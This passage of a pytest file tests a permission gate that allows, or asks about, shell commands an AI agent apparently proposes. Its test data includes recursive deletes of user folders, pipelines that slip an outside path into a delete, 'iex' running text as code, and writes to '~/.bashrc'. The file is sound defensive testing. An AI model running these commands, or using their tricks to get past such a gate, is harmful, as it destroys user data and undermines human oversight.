    "Get-ChildItem -Recurse | ForEach-Object { Remove-Item $_ }",
    "Get-ChildItem outputs -Recurse -File | ForEach-Object { Remove-Item $_ }",
    "Get-ChildItem .tmp -Recurse | ForEach-Object { Remove-Item $_ }; Set-Location ..",
    "Get-ChildItem .tmp -FollowSymlink -Recurse | Remove-Item",
    "Get-ChildItem $dir -Recurse | Remove-Item",
    "Get-Content list.txt | ForEach-Object { Remove-Item $_ }",
    "Get-ChildItem .tmp | ForEach-Object { Get-ChildItem C:/Users/pi -Recurse } | Remove-Item",
])
def test_a_powershell_listing_piped_into_a_delete_asks_outside_step_tmp(command):
    decision = _decide_powershell_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    "Get-ChildItem .tmp -Recurse -File | ForEach-Object { Remove-Item $_ -Force }",
    "gci -Path .tmp/cache -r | Remove-Item -Force",
    "Get-ChildItem .tmp -Filter *.part | Remove-Item",
    "Get-ChildItem -LiteralPath .tmp/a -Recurse -File -ErrorAction SilentlyContinue | % { $_.Delete() }",
    "Get-ChildItem . -Recurse | Where-Object { $_.Name -like '*rm*' } | Select-Object Name",
    # #533: filters that pass the listed items on unchanged keep the pipeline readable.
    "Get-ChildItem .tmp -File | Where-Object { $_.Length -gt 0 } | Sort-Object Length | Select-Object -First 3 "
    "| Remove-Item -Confirm:$false",
    "gci .tmp -r | ? Length -gt 0 | % { $PSItem.Delete($true) }",
])
def test_a_powershell_listing_of_step_tmp_piped_into_a_delete_stays_allowed(command):
    assert _decide_powershell_in_windows_step(command).action == "allow"


@pytest.mark.parametrize("command", [
    # #533: after a listing of .tmp, a delete of another path, a stage that makes new objects, or text run as code.
    "Get-ChildItem .tmp | % { [System.IO.DirectoryInfo]::new('C:/outside').Delete($true) }",
    "Get-ChildItem .tmp | ForEach-Object { [System.IO.Directory]::Delete('C:/outside', $true) }",
    "Get-ChildItem .tmp | % { Remove-Item C:/outside }",
    "Get-ChildItem .tmp | Remove-Item -Path C:/outside",
    "Get-ChildItem .tmp | % { 'C:/outside' } | Remove-Item",
    "Get-ChildItem .tmp | Select-Object @{n='PSPath';e={'C:/outside'}} | Remove-Item",
    "Get-ChildItem .tmp | % { iex $code }",
    "Get-ChildItem .tmp | Where-Object { [IO.File]::Delete('C:/x') } | Remove-Item",
    "Get-ChildItem .tmp | % { Remove-Item $_; Remove-Item C:/x }",
    # A .NET delete names no literal path anywhere else either.
    "[System.IO.Directory]::Delete('C:/Users/pi/Documents', $true)",
    "(Get-Item C:/Users/pi/Documents).Delete($true)",
])
def test_a_powershell_delete_that_may_reach_another_path_asks(command):
    decision = _decide_powershell_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")


@pytest.mark.parametrize("command", [
    # PR #535 review: a .NET delete spelled inside text a data command prints or writes is not a call.
    "Write-Output '$_.Delete()'", """Set-Content notes.txt '[IO.File]::Delete("x")'""",
])
def test_a_dotnet_delete_inside_a_powershell_data_string_is_text(command):
    assert _decide_powershell_in_windows_step(command).action == "allow"
    # Text run as code is still read as a delete.
    assert _decide_powershell_in_windows_step(f"iex {command.split(' ', 1)[1]}").action == "ask"


OUTSIDE_HOME = {"HOME": "/home/pi", "USERPROFILE": "C:\\Users\\pi"}


@pytest.mark.parametrize("command", [
    # #521: a write destination starting with `~` is the shell's home, outside the write roots here.
    "cp a ~/x", "echo x > ~/.bashrc", "curl -o ~/x https://example.org/x", "echo x | tee -a ~/x", "cp a ~",
])
def test_a_tilde_write_destination_is_judged_at_the_shell_home(command):
    decision = evaluate_tool("Bash", {"command": command}, _policy(), ["/work/step"], "/work/step",
                             windows=False, environ=OUTSIDE_HOME)
    assert decision.action == "ask" and "outside allowed roots" in decision.reason
    inside = evaluate_tool("Bash", {"command": command}, _policy(), ["/work/step"], "/work/step",
                           windows=False, environ={"HOME": "/work/step"})
    assert inside.action == "allow"


@pytest.mark.parametrize("command,environ", [
    ("cp a ~root/x", OUTSIDE_HOME), ("cp a ~+/x", OUTSIDE_HOME), ("echo x > ~-/x", OUTSIDE_HOME),
    ("cp a ~/x", {}),  # no HOME: nothing to expand to
])
def test_a_tilde_write_destination_the_gate_cannot_expand_asks(command, environ):
    decision = evaluate_tool("Bash", {"command": command}, _policy(), ["/work/step"], "/work/step",
                             windows=False, environ=environ)
    assert decision.action == "ask" and "cannot expand" in decision.reason


@pytest.mark.parametrize("command", [
    "Set-Content ~/x 'a'", r"'a' > ~\x", "Invoke-WebRequest https://example.org/x -OutFile ~/x",
])
def test_a_powershell_tilde_write_is_judged_at_every_home_the_shell_may_use(command):
    root = "C:/Users/pi/labhq/work/step"
    outside = {"USERPROFILE": "C:\\Users\\pi"}
    assert evaluate_tool("PowerShell", {"command": command}, _policy(), [root], root, windows=True,
                         environ=outside).action == "ask"
    # Windows PowerShell 5.1 may take HOMEDRIVE+HOMEPATH instead of USERPROFILE: both must be inside.
    split = {"USERPROFILE": root, "HOMEDRIVE": "H:", "HOMEPATH": "\\"}
    assert evaluate_tool("PowerShell", {"command": command}, _policy(), [root], root, windows=True,
                         environ=split).action == "ask"
    assert evaluate_tool("PowerShell", {"command": command}, _policy(), [root], root, windows=True,
                         environ={"USERPROFILE": root}).action == "allow"


@pytest.mark.parametrize("command", ["cat ~/notes.txt > out.txt", "cp ~/a out.txt", "ls ~"])
def test_tilde_read_paths_are_unchanged(command):
    assert evaluate_tool("Bash", {"command": command}, _policy(), ["/work/step"], "/work/step",
                         windows=False, environ=OUTSIDE_HOME).action == "allow"


@pytest.mark.parametrize("command", ["find -- /c/Users/pi/Documents -delete", "find -files0-from list.txt -delete"])
def test_find_start_paths_given_through_options_ask(command):
    decision = _decide_in_windows_step(command)
    assert decision.action == "ask"
    assert decision.reason.startswith("재귀 삭제 확인 필요: `")
